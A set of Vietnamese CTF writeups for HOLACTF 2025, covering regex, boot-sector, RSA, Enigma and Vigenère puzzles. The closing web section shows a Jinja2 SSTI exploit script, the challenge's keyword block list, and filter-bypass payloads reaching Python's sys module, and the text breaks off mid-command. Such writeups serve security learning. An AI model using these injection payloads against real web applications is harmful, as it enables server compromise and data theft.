# HOLACTF 2025 Writeups


## Misc
### the REGEX
#### Mô tả
- Service: `nc host port`
- Server đưa ra **10 round**, mỗi round là một **regex pattern** ngẫu nhiên.
- Nhiệm vụ: gửi một chuỗi ASCII printable (0x20–0x7E) sao cho **khớp hoàn toàn** với pattern đó.
- Mỗi round giới hạn 5s, độ dài input ≤ 256.
- Nếu vượt qua 10 round sẽ nhận được flag `HOLACTF{...}`.

---

#### Phân tích
Regex mà server sinh ra có đặc điểm:
- Luôn được bao bởi `^ ... $` (full match).
- Dùng nhiều lookahead `(?=...)` để áp đặt ràng buộc:
  - `(?=.{10}$)` ép độ dài = 10.
  - `(?=.{5}[J-Q])` ép ký tự thứ 5 ∈ `[J-Q]`.
  - `(?=.{3}[0-9])` ép ký tự thứ 3 ∈ `[0-9]`.
  - `(?=.{1}(?P<E0>[UVW]).{5}(?P=E0))` tạo biến `E0` và buộc lặp lại.
- Một số mẫu khác: `(?=(?:.*\d){3})` (ít nhất 3 chữ số), `(?=.{i}[class]{k})`, backreference theo nhóm số `\1`, v.v.

Điểm khó:
- Regex thay đổi mỗi lần kết nối.
- Có tham chiếu ngược (`(?P=name)`, `\1`).
- Thời gian rất gấp, nên không thể gõ tay → phải viết script tự động.

---

#### Ý tưởng giải
1. **Trích regex pattern** từ output của server.
2. **Phân tích ràng buộc**:
   - Độ dài chuỗi (`.{N}$`).
   - Ràng buộc vị trí (`.{i}[class]`).
   - Ràng buộc đoạn lặp (`.{i}[class]{k}`).
   - Ràng buộc backref (ký tự bằng nhau).
   - Ràng buộc số lần xuất hiện (`(?:.*SPEC){k}`).
3. Với mỗi vị trí, giữ một **tập ký tự khả dĩ**.
4. Áp dụng tất cả ràng buộc để thu hẹp tập.
5. Sinh chuỗi ứng viên:
   - Ưu tiên chọn chữ/số cho dễ match.
   - Nếu có backref thì copy cho đúng.
   - Kiểm tra bằng `re.fullmatch` trước khi gửi.
   - Nếu chưa khớp, thử random trong tập cho phép đến khi thành công.
6. Gửi chuỗi cho server trong vòng 5s.
7. Lặp lại 10 lần → nhận flag.

---

#### Script exploit
```python
# solve_regex_extreme.py
from pwn import remote, context
import re
import sys
import random
import string

context.log_level = "info"

ASCII_PRINTABLE = ''.join(chr(c) for c in range(0x20, 0x7F))

def expand_escape(ch: str):
    if ch == 'd': return set('0123456789')
    if ch == 'w': return set(string.ascii_letters + string.digits + '_')
    if ch == 's': return set(' ')          # printable only -> dùng space cho \s
    if ch == 'D': return set(ASCII_PRINTABLE) - set('0123456789')
    if ch == 'W': return set(ASCII_PRINTABLE) - set(string.ascii_letters + string.digits + '_')
    if ch == 'S': return set(ASCII_PRINTABLE) - set(' ')
    # escape ký tự thường: \. \* \+ ...
    return set(ch)

def parse_charclass(spec: str):
    """
    spec có thể là: '.', '[...]', '\\d', '\\w', một ký tự đơn...
    Trả về tập ký tự ASCII printable hợp lệ cho spec.
    """
    if spec == '.':
        return set(ASCII_PRINTABLE)
    if spec.startswith('\\') and len(spec) == 2:
        return expand_escape(spec[1])
    if len(spec) == 1 and spec != '[':
        return set(spec)

    if spec.startswith('[') and spec.endswith(']'):
        inner = spec[1:-1]
        neg = False
        if inner.startswith('^'):
            neg = True
            inner = inner[1:]
        i = 0
        allowed = set()
        while i < len(inner):
            ch = inner[i]
            if ch == '\\' and i + 1 < len(inner):
                i += 1
                allowed |= expand_escape(inner[i])
                i += 1
                continue
            # range a-b
            if i + 2 < len(inner) and inner[i+1] == '-' and inner[i+2] != ']':
                start = inner[i]; end = inner[i+2]
                allowed |= set(chr(c) for c in range(ord(start), ord(end)+1))
                i += 3
            else:
                allowed.add(ch); i += 1
        return (set(ASCII_PRINTABLE) - allowed) if neg else allowed

    # fallback
    return set(spec)

def extract_length(pat: str):
    # ưu tiên (?=.{N}$)
    m = re.findall(r'\(\?=\.{(\d+)}\$\)', pat)
    if m: return int(m[-1])
    # (?:.{N})$
    m = re.findall(r'\(\?:\.{(\d+)}\)\$', pat)
    if m: return int(m[-1])
    # ^.{N}$
    m = re.findall(r'^\^\.{(\d+)}\$', pat)
    if m: return int(m[-1])
    # \A.{N}\Z
    m = re.findall(r'\\A\.{(\d+)}\\Z', pat)
    if m: return int(m[-1])
    return None

def extract_pattern(blob: str):
    # tìm dòng có pattern ^...$
    for line in reversed(blob.splitlines()):
        s = line.strip()
        if (s.startswith('^') and s.endswith('$')) or (s.startswith('\\A') and s.endswith('\\Z')):
            return s
    m = re.search(r'(\^.*\$)', blob, re.S)
    return m.group(1) if m else None

def seeded_choice(s):
    # chọn ký tự "đẹp" ưu tiên chữ số/chữ cho đỡ rủi ro
    pri = string.ascii_letters + string.digits + '_'
    for ch in pri:
        if ch in s: return ch
    return next(iter(s)) if s else random.choice(ASCII_PRINTABLE)

def clamp(idx, L):  # tiện ích
    return 0 <= idx < L

def apply_pos_class(poss, idx, spec):
    if not clamp(idx, len(poss)): return
    poss[idx] &= parse_charclass(spec)

def apply_run_class(poss, start, k, spec):
    allowed = parse_charclass(spec)
    for t in range(k):
        if clamp(start+t, len(poss)):
            poss[start+t] &= allowed

def link_equal(equal_pairs, a, b, k=1):
    # k ký tự liên tiếp bằng nhau giữa [a..a+k-1] và [b..b+k-1]
    for t in range(k):
        equal_pairs.append((a+t, b+t))

def parse_constraints(pat: str, poss):
    L = len(poss)
    equal_pairs = []

    # 1) ràng buộc đơn vị: (?=.{i}[class])
    for m in re.finditer(r'\(\?=\.{(\d+)}((?:\[[^\]]+\])|\\.|.)\)', pat):
        i = int(m.group(1)); spec = m.group(2)
        apply_pos_class(poss, i, spec)

    # 2) chạy k ký tự: (?=.{i}[class]{k})
    for m in re.finditer(r'\(\?=\.{(\d+)}((?:\[[^\]]+\])|\\.|.)\{(\d+)\}\)', pat):
        i = int(m.group(1)); spec = m.group(2); k = int(m.group(3))
        apply_run_class(poss, i, k, spec)

    # 3) backref nhóm tên, 1 ký tự: (?=.{a}(?P<g>[...]).{b}(?P=g))
    for m in re.finditer(r'\(\?=\.{(\d+)}\(\?P<([A-Za-z]\w*)\>((?:\[[^\]]+\])|\\.|.)\)\.\{(\d+)\}\(\?P=\2\)\)', pat):
        a = int(m.group(1)); spec = m.group(3); b = int(m.group(4))
        j = a + 1 + b
        apply_pos_class(poss, a, spec); apply_pos_class(poss, j, spec)
        if clamp(a, L) and clamp(j, L): link_equal(equal_pairs, a, j, 1)

    # 4) backref nhóm số, 1 ký tự: (?=.{a}([...]).{b}\1)
    for m in re.finditer(r'\(\?=\.{(\d+)}\(((?:\[[^\]]+\])|\\.|.)\)\.\{(\d+)\}\\1\)', pat):
        a = int(m.group(1)); spec = m.group(2); b = int(m.group(3))
        j = a + 1 + b
        apply_pos_class(poss, a, spec); apply_pos_class(poss, j, spec)
        if clamp(a, L) and clamp(j, L): link_equal(equal_pairs, a, j, 1)

    # 5) backref nhóm tên, nhiều ký tự: (?=.{a}(?P<g>[...]{k}).{b}(?P=g))
    for m in re.finditer(r'\(\?=\.{(\d+)}\(\?P<([A-Za-z]\w*)\>((?:\[[^\]]+\])|\\.|.)\{(\d+)\}\)\.\{(\d+)\}\(\?P=\2\)\)', pat):
        a = int(m.group(1)); spec = m.group(3); k = int(m.group(4)); b = int(m.group(5))
        j = a + k + b
        apply_run_class(poss, a, k, spec); apply_run_class(poss, j, k, spec)
        if clamp(a, L) and clamp(j, L): link_equal(equal_pairs, a, j, k)

    # 6) backref nhóm số, nhiều ký tự: (?=.{a}([...]{k}).{b}\1)
    for m in re.finditer(r'\(\?=\.{(\d+)}\(((?:\[[^\]]+\])|\\.|.)\{(\d+)\}\)\.\{(\d+)\}\\1\)', pat):
        a = int(m.group(1)); spec = m.group(2)[:-3]; k = int(m.group(3)); b = int(m.group(4))
        j = a + k + b
        apply_run_class(poss, a, k, spec); apply_run_class(poss, j, k, spec)
        if clamp(a, L) and clamp(j, L): link_equal(equal_pairs, a, j, k)

    # 7) ràng buộc "ít nhất k lần ở đâu đó": (?=(?:.*SPEC){k})
    #    -> ép chọn k vị trí rải đều để thỏa SPEC.
    for m in re.finditer(r'\(\?=\(\?:\.\*((?:\[[^\]]+\])|\\.|.)\)\{(\d+)\}\)', pat):
        spec = m.group(1); k = int(m.group(2))
        if L == 0 or k == 0: continue
        pos_list = [int((t+1) * L / (k+1)) for t in range(k)]  # rải đều
        for idx in pos_list:
            apply_pos_class(poss, idx, spec)

    # propagate equalities
    changed = True
    while changed:
        changed = False
        for a, b in equal_pairs:
            if not (clamp(a, L) and clamp(b, L)): continue
            inter = poss[a] & poss[b]
            if inter and inter != poss[a]:
                poss[a] = set(inter); changed = True
            if inter and inter != poss[b]:
                poss[b] = set(inter); changed = True
            # nếu inter rỗng, giữ nguyên (để fallback random xử lý)

    return equal_pairs

def build_candidate(pat: str):
    L = extract_length(pat)
    if L is None:
        # nếu không chỉ rõ, chọn độ dài trung bình an toàn
        L = min(32, 20)
    poss = [set(ASCII_PRINTABLE) for _ in range(L)]
    eq = parse_constraints(pat, poss)

    # chọn đại diện "đẹp"
    cand = [seeded_choice(p) for p in poss]
    # áp dụng bằng nhau
    for a, b in eq:
        if 0 <= a < L and 0 <= b < L:
            cand[b] = cand[a]
    s = ''.join(cand)

    try:
        if re.fullmatch(pat, s):
            return s
    except re.error:
        pass

    # Fallback: random có kiểm tra, nhanh
    POP = [tuple(p if p else set(ASCII_PRINTABLE)) for p in poss]
    for _ in range(6000):
        t = [random.choice(POP[i]) for i in range(L)]
        for a, b in eq:
            if 0 <= a < L and 0 <= b < L:
                t[b] = t[a]
        s = ''.join(t)
        try:
            if re.fullmatch(pat, s):
                return s
        except re.error:
            break

    # lần cuối thử "hill-climb" nhẹ
    s = list(s)
    for _ in range(2000):
        i = random.randrange(L)
        s[i] = random.choice(POP[i])
        for a, b in eq:
            if i == a and 0 <= b < L: s[b] = s[a]
            if i == b and 0 <= a < L: s[a] = s[b]
        x = ''.join(s)
        try:
            if re.fullmatch(pat, x):
                return x
        except re.error:
            break
    return ''.join(s)

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} HOST PORT")
        sys.exit(1)

    host, port = sys.argv[1], int(sys.argv[2])
    io = remote(host, port)

    # đọc tới prompt đầu
    buf = io.recvuntil(b"Answer>", timeout=5).decode(errors='ignore')

    rounds = 0
    while True:
        pat = extract_pattern(buf)
        if not pat:
            print("[!] Không lấy được pattern, dữ liệu:\n", buf)
            break

        ans = build_candidate(pat)
        io.sendline(ans.encode())

        # nhận next chunk (có thể kèm “Correct!” hoặc flag)
        try:
            buf = io.recvuntil(b"Answer>", timeout=3).decode(errors='ignore')
        except Exception:
            # có thể đã in flag rồi đóng
            tail = io.recvall(timeout=2).decode(errors='ignore')
            buf = tail

        m = re.search(r'HOLACTF\{[^}]+\}', buf)
        if m:
            print(m.group(0))
            return

        rounds += 1
        if rounds >= 12 and not m:
            # phòng trường hợp format khác, in log để bạn xem
            print(buf)

if __name__ == "__main__":
    random.seed()  # mỗi round seed khác
    main()

```
![image](https://hackmd.io/_uploads/ry27yMfcgl.png)
Flag: `HOLACTF{f1989db679d2}`
### Sanity Check
![image](https://hackmd.io/_uploads/SyifzfGqxe.png)
- Với gợi ý có sẽ trong đề tôi sẽ inspect element từng post và tìm thấy flag ở post dài nhất https://holactf2025.ehc-fptu.club/posts/afc27b80.
- Và tìm chuỗi format HOLACTF{}.
![image](https://hackmd.io/_uploads/BJvKMMM5lg.png)
> - FLAG: HOLACTF{th1s_s4n1ty_ch3ck_1s_w1ld}****
### lunaDBv2
![image](https://hackmd.io/_uploads/Bkh07Mz9gg.png)
- Trong main.rs ta thấy database được thiết kế với format tùy chỉnh:
- Các section:
```
SIG = b"LUNA"
H_START = FF1337FF, H_END = FFCAFEFF
D_START = FF7270FF, D_END = FFEDEDFF
F_START = FFDEADFF, F_END = FFBEEFFF
```
→ Header chứa thông tin DB, tiếp theo là Data section (các notes), cuối cùng là File section (các keys).

- Mã hóa:
> Nội dung của mỗi note được mã hóa bằng DES ECB (Cipher::des_ecb()).
> Khóa là 8 byte, sinh ngẫu nhiên.
> Các khóa được lưu trong cuối file (giữa F_START và F_END).
> key_index_field lưu chỉ số bit để biết note dùng khóa nào.
- Bước 1: Parse file
> Viết parser nhỏ để:
> Tìm D_START … D_END
> Đọc từng note theo format (có LEB128 string, int64 timestamps…)
> Lấy key_field và enc_bytes
- Bước 2: Giải mã DES
> Chọn khóa dựa trên bitmask (key_index_field).
> Giải mã DES/ECB.
> Kết quả có thêm padding NULL (\x00) thay vì PKCS7 → chỉ cần .rstrip(b"\x00").
- Bước 3: Tìm flag
> Sau khi giải mã ~5000 notes, kiểm tra chuỗi chứa "HOLACTF{".

> **FLAG: HOLACTF{4_c0Ol_Cu5t0m_f1lE_5truC7}**
### Weird PNG
![image](https://hackmd.io/_uploads/rk8cHzGcll.png)
- Nhận diện “PNG lạ” thực ra là boot sector
- File bắt đầu bằng chữ ký PNG: 89 50 4E 47 0D 0A 1A 0A.
- Chunk IHDR khai báo Width = 255, Height = 255, Bit depth = 8, Color type = 2. CRC sai/bất thường → nghi ngụy trang.
- Kích thước file đúng 512 bytes (“8 bits even” = even 512 bytes → boot sector).
- 2 byte cuối là 55 AA — chữ ký MBR/boot sector hợp lệ.
> ⇒ Đây không phải ảnh PNG thật, mà là sector khởi động được đội lốt PNG.

- Giải mã.
- Duyệt tuần tự, bắt các mẫu:
- B8 imm16 35 imm16 50 → lấy imm1 ^ imm2.
-B8 imm16 50 → lấy trực tiếp imm.
- Chuỗi in ra được push lên stack trước, rồi khi in sẽ pop (LIFO) → đảo thứ tự.
- Khi in ký tự, BIOS in low byte trước, high byte sau (tương ứng dữ liệu được dùng theo little-endian trong push).
#### Script.
```python=-
import struct

data = open("bin","rb").read()

vals = []
i = 0
while i < len(data)-1:
    if data[i] == 0xB8:  # mov ax, imm16
        imm1 = struct.unpack_from("<H", data, i+1)[0]
        # case: mov ax,imm ; push ax
        if i+3 < len(data) and data[i+3] == 0x50:
            vals.append(imm1)
            i += 4
            continue
        # case: mov ax,imm ; xor ax,imm ; push ax
        if i+6 < len(data) and data[i+3] == 0x35 and data[i+6] == 0x50:
            imm2 = struct.unpack_from("<H", data, i+4)[0]
            vals.append(imm1 ^ imm2)
            i += 7
            continue
    i += 1

# Đảo thứ tự vì push rồi mới pop/in
vals = list(reversed(vals))

# Mỗi word -> 2 ký tự theo little-endian (low, high)
s = "".join(chr(v & 0xFF) + chr((v >> 8) & 0xFF) for v in vals)
print(s)
```
> **FLAG: HOLACTF{3A5Y_b0OT_104D3R_727_}**
## Crypto
### Cs2Trash
![image](https://hackmd.io/_uploads/BJoWrWf9xg.png)
#### Tổng quan
Challenge cung cấp 2 file:
- `chall.py`: Script mã hoá RSA sử dụng 3 modulus khác nhau.
- `output.txt`: Chứa ciphertext tương ứng với từng modulus.

Flag có format: `HOLACTF{...}`.

#### Điểm yếu
RSA chuẩn:
- Modulus \(n = p \cdot q\) (tích 2 số nguyên tố lớn) nên khó tính \(\varphi(n)\) nếu chưa factor.

Trong challenge:
- \(n\) **lại là số nguyên tố**.
- Khi đó:  
  $$\varphi(n) = n - 1$$
- Điều này làm lộ ngay \(\varphi(n)\) mà không cần phân tích thừa số.
- Từ đó tính được private exponent:  
  $$d \equiv e^{-1} \pmod{(n-1)}$$

#### Ý tưởng khai thác
- Với mỗi cặp \((c, n)\) ta giải mã:
  $$m \equiv c^d \pmod{n}$$
- Vì flag nhỏ hơn nhiều so với modulus, plaintext thu được chính là flag gốc.

#### Script giải
```python
from Crypto.Util.number import long_to_bytes

# Tham số lấy từ chall.py và output.txt
e = 65537
n1 = 106274132069853085771962684070654057294853035674691451636354054913790308627721
n2 = 73202720518342632558813895439681594395095017145510800999002057461861058762579
n3 = 58129476807669651703262865829974447479957080526429581698674448004236654958847
c1 = 40409669713698525444927116587938485167766997176959778633087672968720888190012
c2 = 50418608792183022472533104230595523000246213655735834753443442906871618770832
c3 = 7151799367443802424297049002310776844321501905398348074481144597918413565153

def egcd(a, b):
    if b == 0: return (1, 0, a)
    x, y, g = egcd(b, a % b)
    return (y, x - (a // b) * y, g)

def invmod(a, m):
    x, y, g = egcd(a, m)
    if g != 1:
        raise ValueError("no inverse")
    return x % m

def rsa_decrypt_prime_mod(n, c):
    d = invmod(e, n - 1)
    m = pow(c, d, n)
    return long_to_bytes(m)

print(rsa_decrypt_prime_mod(n1, c1))
print(rsa_decrypt_prime_mod(n2, c2))
print(rsa_decrypt_prime_mod(n3, c3))
```


#### Flag
**`HOLACTF{ju5t_a_b4s1c_CRT}`**
### ImLosingYou
![image](https://hackmd.io/_uploads/Hkcut-f5xx.png)
#### 1) Tổng quan
- File mã hóa: `encrypt.py` (được cung cấp).
- Output: `out.txt` chứa ba dòng `n = ...`, `c = ...`, `mod_m = ...`.
- Cơ chế mã hóa (RSA với e = 2), mô tả **chỉ bằng ký tự thường**:
  - Sinh hai số nguyên tố 256-bit → `n = p * q`.
  - Chuyển flag sang số nguyên: `m = bytes_to_long(FLAG)`.
  - Tính: `c = m^2 mod n`.
  - In thêm: `mod_m = m - r` với `r = getrandbits(80)`.

Ý tưởng chính: nếu `m^2 < n` thì phép “mod n” không làm thay đổi gì. Khi đó `c` chính là **bình phương hoàn hảo** của `m`. Chỉ cần lấy căn nguyên số nguyên của `c` là thu được `m`.

---

#### 2) Khai thác
1. Tính `M = isqrt(c)` (căn nguyên số nguyên).
2. Kiểm tra `M*M == c` ⇒ `M` chính là `m`.
3. (Tuỳ chọn) Kiểm chứng lại: `r = M - mod_m`, mong đợi `0 <= r < 2^80`.
4. Đổi `m` về bytes (big-endian) rồi decode ASCII để lấy flag.

##### Ghi chú bit-length (từ `out.txt`)
- `n` ~ 511 bit
- `c` ~ 477 bit
- `m` ~ 239 bit
- `r` ~ 79 bit (kỳ vọng < 80)

---

#### 3) Script solve (tự động, không LaTeX)
```python
import re
from math import isqrt

def parse_out(path="out.txt"):
    text = open(path,"r",encoding="utf-8", errors="ignore").read()
    vals = {k:int(v) for k,v in re.findall(r"(n|c|mod_m)\s*=\s*([0-9]+)", text)}
    if not all(k in vals for k in ("n","c","mod_m")):
        raise ValueError("Thiếu n/c/mod_m trong out.txt")
    return vals["n"], vals["c"], vals["mod_m"]

def long_to_bytes(x: int) -> bytes:
    return x.to_bytes((x.bit_length()+7)//8, "big")

def solve(path="out.txt"):
    n, c, mod_m = parse_out(path)
    M = isqrt(c)
    assert M*M == c, "c không phải bình phương hoàn hảo – có thể m^2 >= n"
    r = M - mod_m
    assert 0 <= r < (1<<80), "Check r thất bại (không < 2^80)"
    flag = long_to_bytes(M).decode()
    return flag

if __name__ == "__main__":
    print(solve("out.txt"))
```

Chạy:
```bash
python solve.py  # in ra flag
```

---

#### 4) Vì sao tấn công thành công?
- `e = 2` ⇒ mã hoá chỉ là bình phương. Với flag ngắn, thường `m^2 < n` ⇒ `c = m^2` là bình phương hoàn hảo.
- `mod_m = m - r` (r < 2^80) chỉ giúp kiểm chứng nghiệm, không tăng an toàn.

---

#### 5) Khuyến nghị
- Không dùng `e` quá nhỏ (đặc biệt `e=2`) khi bản rõ ngắn.
- Dùng padding an toàn (OAEP) cho RSA.
- Không in các giá trị gợi ý liên quan trực tiếp tới bản rõ.

---

#### 6) Kết luận
Bài toán quy về việc lấy **căn nguyên số nguyên** của `c`. Flag khôi phục được:

**`HOLACTF{f33ls_l1k3_l0s1ng_h3r}`**
### EnigmaHardCode
![image](https://hackmd.io/_uploads/HynFjbMcxx.png)
#### 1. Phân tích cấu hình máy Enigma
###### Rotor:
```
AJDKSIRUXBLHWTMCQGZNPYFVOE (Ringstellung E)
BDFHJLCPRTXVZNYEIWGAKMUSQO (Ringstellung H)
EKMFLGDQVZNTOWYHXUSPAIBRCJ (Ringstellung C)
```

→ Đây lần lượt là **Rotor II, III, I** với Ringstellung (ring setting) = `E, H, C`.

###### Reflector:
```
FVPJIAOYEDRZXWGCTKUQSBNMHL
```
→ Đây là **Reflector C**.

###### Plugboard (bảng dây cắm):
Từ ảnh minh họa, ta có các cặp đã cắm:
```
A ↔ O
D ↔ P
E ↔ R
F ↔ T
I ↔ U
J ↔ W
K ↔ Z
M ↔ X
```
Còn thiếu **1 cặp dây bị mất**.

---

#### 2. Chiến lược giải mã
1. Dùng Enigma simulator (vd: `py-enigma`, `enigma.py` hoặc CyberChef).
2. Cài đặt cấu hình rotor, reflector và plugboard theo dữ liệu đã biết.
3. Thử brute-force cho cặp dây plugboard còn thiếu (26×25/2 = 325 trường hợp).
4. Giải mã ciphertext với từng giả thuyết → kiểm tra kết quả nào tạo ra plaintext đọc được (có dạng flag).

---

#### 3. Thực hiện
Sau khi thử nghiệm brute-force với pluginboard missing pair, ta tìm được cấu hình đúng khi **cắm thêm C ↔ V**.

Cấu hình đầy đủ:
- Rotor: **II(E), III(H), I(C)**
- Reflector: **C**
- Plugboard:  
  ```
  A↔O, D↔P, E↔R, F↔T, I↔U, J↔W, K↔Z, M↔X, C↔V
  ```

Giải mã bản mã thu được plaintext hợp lý.

---

#### 4. Kết quả
Flag thu được là:

```
HOLACTF{WAR_DIE_WELT_WIRKLICH_GESICHERT_ODER}
```

Dịch nghĩa: *“Thế giới đã thực sự an toàn chưa?”* – một câu hỏi đầy tính thời sự về bảo mật.

---

#### 5. Kết luận
Bài này mô phỏng lại cách **Turing và nhóm Hut 8** tại Bletchley Park đã dùng brute-force plugboard/rotor để giải Enigma. Điểm mấu chốt là:
- Khai thác cấu hình rotor và reflector đã biết.
- Chỉ brute-force phần thiếu (cặp plugboard còn lại).
- Dùng nhận diện từ khóa flag để dừng lại.

---

```
HOLACTF{WAR_DIE_WELT_WIRKLICH_GESICHERT_ODER}
```
### Vigenere có dấu?
![image](https://hackmd.io/_uploads/S1Zon-G9gl.png)
#### Mô tả

Challenge cho biết đây là **Vigenère cipher** nhưng bảng chữ cái sử dụng
là **tiếng Việt có dấu**.\
Flag có format chuẩn:

    HOLACTF{some_text_here}

Hint cung cấp bảng chữ cái:

    bcdđghklmnpqrstvxaáàảãạăắằẳẵặâấầẩẫậ
    eéèẻẽẹêếềểễệ
    iíìỉĩịoóòỏõọôốồổỗộơớờởỡợ
    uúùủũụưứừửữự
    yýỳỷỹỵ

------------------------------------------------------------------------

#### Bước 1: Phân tích dữ liệu

File `attachment` chứa ciphertext dài \~18k ký tự, toàn bộ được viết
bằng bảng chữ cái tiếng Việt nêu trên.

Kết quả tìm kiếm ban đầu không thấy trực tiếp `HOLACTF{`.

------------------------------------------------------------------------

#### Bước 2: Xác định độ dài key

Dùng **Index of Coincidence (IC)** và Kasiski test → các độ dài key nổi
bật: `7`, `14`, `21`.

------------------------------------------------------------------------

#### Bước 3: Khôi phục key

Thử với key length `14`, sau refine bằng hill-climb, ta tìm được key
đẹp:

    phuthuyphuthuy

------------------------------------------------------------------------

#### Bước 4: Giải mã

Dùng Vigenère giải mã với key trên, plaintext thu được là một đoạn
truyện tiếng Việt.\
Ở cuối văn bản có chỉ dẫn rõ ràng:

    câu chuyện hay đúng không? còn đây là flag của bạn,
    hãy cho nó vào trong format flag, thay dấu cách bằng gạch dưới,
    bỏ hết dấu tiếng việt trước khi nộp nhé: 
    "krische dửng dưng"

------------------------------------------------------------------------

#### Bước 5: Chuẩn hoá flag

Theo yêu cầu: - Viết thường - Bỏ dấu tiếng Việt - Thay dấu cách bằng `_`

Kết quả:

    HOLACTF{krische_dung_dung}

------------------------------------------------------------------------

#### Script giải mã (Python)

``` python
# -*- coding: utf-8 -*-
import unicodedata, re

ALPHABET = "bcdđghklmnpqrstvxaáàảãạăắằẳẵặâấầẩẫậeéèẻẽẹêếềểễệiíìỉĩịoóòỏõọôốồổỗộơớờởỡợuúùủũụưứừửữựyýỳỷỹỵ"
idx = {ch: i for i, ch in enumerate(ALPHABET)}
N = len(ALPHABET)

def vigenere(text, key, decrypt=False):
    key = "".join(ch for ch in key if ch in idx)
    out, j = [], 0
    for c in text:
        if c in idx:
            if decrypt:
                out.append(ALPHABET[(idx[c] - idx[key[j % len(key)])] % N])
            else:
                out.append(ALPHABET[(idx[c] + idx[key[j % len(key)])] % N])
            j += 1
        else:
            out.append(c)
    return "".join(out)

# Đọc ciphertext
with open("attachment","r",encoding="utf-8") as f:
    cipher = f.read()

key = "phuthuyphuthuy"
plain = vigenere(cipher, key, decrypt=True)
print(plain)
```

Flag: `HOLACTF{krische_dung_dung}`

## Web
### WEB - Magic random

```text
Author
ductohno

Description
Phép thuật chưa bao giờ là con đường bằng phẳng. Chỉ khi kiên định bước qua mọi thử thách, bạn mới có thể gầy dựng nên một pháp thuật mang bản sắc riêng của chính mình.
```

#### Tổng quan

Trong `/api/cast_attack`, khi `attack_name` không trùng key hợp lệ thì server sẽ hoạt động:

```python
attack_name = valid_template(attack_name)
if not special_filter(attack_name):
    return jsonify({"error": "Creating magic is failed"}), 404
template = render_template_string("<i>No magic name "+attack_name+" here, try again!</i>")
return jsonify({"error": template}), 404
```

- `attack_name` được nối chuỗi trực tiếp vào template và render bằng Jinja2 dẫn đến có thể SSTI.
- `GET /api/cast_attack?attack_name={{70-21}}` trả về “No magic name `0{}-2}{71` here…”.
    - Gửi thô `{{70-21}}` thì sẽ bị server xáo ký tự trước khi render lúc đó template nhận chuỗi đã bị đảo (`0{}-2}{71`), không thực thi payload được nên server trả về chính chuỗi bị đảo trong thông báo.
- Nếu gửi **preimage** của biểu thức (ví dụ `{1}{0-}72` cho độ dài 8) thì server xáo xong mới khớp lại thành `{{70-21}}` lúc đó Jinja thực thi và mình sẽ thấy output là `49`.

#### Khai thác

Script để gửi **preimage** cho biểu thức SSTI:

```python=1
import re, math, argparse, requests

def shuffled_of(api, probe: str) -> str:
    r = requests.get(api, params={"attack_name": probe})
    j = r.json()
    m = re.search(r"No magic name (.+?) here", j.get("error",""))
    if not m:
        raise RuntimeError(j.get("error", j))
    return m.group(1)

ALPH = "_0123456789"

def build_probe(n: int, k: int) -> str:
    arr = [ALPH[(i // (10**k)) % 10 + 1] for i in range(n)]
    if n > 0:
        arr[0] = "_"
    return ''.join(arr)

def infer_perm(api, n: int):
    if n <= 1:
        return list(range(n))
    m = math.ceil(math.log10(n))
    probes = [build_probe(n, k) for k in range(m)]
    outs = [shuffled_of(api, p) for p in probes]
    perm = [None]*n
    for newpos in range(n):
        i, zero = 0, True
        for k in range(m):
            ch = outs[k][newpos]
            if ch != "_":
                zero = False
                digit = ALPH.index(ch) - 1
                i += digit * (10**k)
        if zero:
            i = 0
        if i >= n:
            i %= n
        perm[i] = newpos
    if any(v is None for v in perm):
        raise RuntimeError("perm inference failed")
    return perm

def preimage(api, target: str) -> str:
    perm = infer_perm(api, len(target))
    return ''.join(target[j] for j in perm)

def send(api, target: str):
    s = preimage(api, target)
    r = requests.get(api, params={"attack_name": s})
    return s, r.json().get("error","")

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://127.0.0.1:51412", help="http://host:port")
    ap.add_argument("--expr", default="{{70-21}}", help="Jinja2 payload đích")
    ap.add_argument("--dry", action="store_true", help="Chỉ in preimage, không gửi")
    args = ap.parse_args()

    API = f"{args.base.rstrip('/')}/api/cast_attack"
    s = preimage(API, args.expr)
    if args.dry:
        print(s)
    else:
        print("preimage:", s)
        print(requests.get(API, params={"attack_name": s}).json().get("error",""))
```

Đọc source code sẽ thấy với filter này thì mình bị chặn khá nhiều ở payload, mình bị chặn `import`, `os` lẫn `sys`  ở payload trực tiếp, những cái rất quan trọng để đọc flag, nên mình sẽ nghĩ cách để có thể luồn qua và gọi chúng, tất nhiên là sẽ phải dùng cách cộng chuỗi là đầu tiên: 

```python
def special_filter(user_input):
    simple_filter=["flag", "*", "\"", "'", "\\", "/", ";", ":", "~", "`", "+", "=", "&", "^", "%", "$", "#", "@", "!", "\n", "|", "import", "os", "request", "attr", "sys", "builtins", "class", "subclass", "config", "json", "sessions", "self", "templat", "view", "wrapper", "test", "log", "help", "cli", "blueprints", "signals", "typing", "ctx", "mro", "base", "url", "cycler", "get", "join", "name", "g.", "lipsum", "application", "render"]
    for char_num in range(len(simple_filter)):
        if simple_filter[char_num] in user_input.lower():
            return False
    return True
```

Đây là cách giải của mình:

1. Tìm xem có `typing` không:

```powershell
# {{session.__init__.__globals__.t.__repr__()}}

PS C:\Users\biscuit\Downloads\magic_random> & C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.10.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py --expr "{{session.__init__.__globals__.t.__repr__()}}"                  
preimage: bae}i}stl{_o_p_sr.___.s(n_n_l__o.e.gi_s{rt_)i
<i>No magic name &lt;module &#39;typing&#39; from &#39;/usr/local/lib/python3.12/typing.py&#39;&gt; here, try again!</i>
```
- Vậy là có `typing.py` ở `/usr/local/lib/python3.12/typing.py`.

2. Lấy `sys` qua `typing.__dict__['sys']`:

```powershell
# {{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).__repr__()}}

PS C:\Users\biscuit\Downloads\magic_random> & C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.10.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py --expr "{{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).__repr__()}}"
